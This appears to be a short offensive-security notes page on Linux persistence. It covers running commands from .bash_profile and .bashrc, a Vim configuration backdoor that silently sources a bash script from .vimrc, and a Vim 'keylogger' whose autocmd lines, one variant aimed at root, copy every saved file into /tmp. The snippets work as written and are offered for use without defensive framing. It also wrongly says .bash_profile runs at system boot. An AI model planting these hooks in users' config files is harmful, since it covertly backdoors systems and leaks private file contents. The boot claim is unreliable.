---
layout:     post
author:     0x5c4r3
type: docs
permalink: Linux_Config_Files
---


<span style="font-size: 35px; color:red"><b>Linux Configuration Files</b></span>

You can add bash commands to these file to execute them:
- <span style="color:red">.bash_profile</span>: run when the system boots.
- <span style="color:red">.bashrc</span>: run when a new terminal window is open.

&nbsp;

---
&nbsp;
<span style="font-size: 25px; color:white"><b>Vim Configuration Backdoor</b></span>

Opening VIM, you can run commands (after the <span style="color:red">:</span>) like <span style="color:red">! touch /tmp/test.txt</span>

Modify <span style="color:red">.vimrc</span> (or create a new one like <span style="color:red">.vimrunscript</span>) adding commands and load them with <span style="color:red">:silent !source ~/.vimrunscript</span> (where <span style="color:red">vimrunscript</span> is a bash script file)
&nbsp;

---
&nbsp;
<span style="font-size: 25px; color:white"><b>Vim Keylogger</b></span>
```shell
:autocmd BufWritePost * :silent :w! >> /tmp/hackedfromvim.txt
```
OR
```shell
:if $USER == "root"
:autocmd BufWritePost * :silent :w! >> /tmp/hackedfromvim.txt
:endif
```
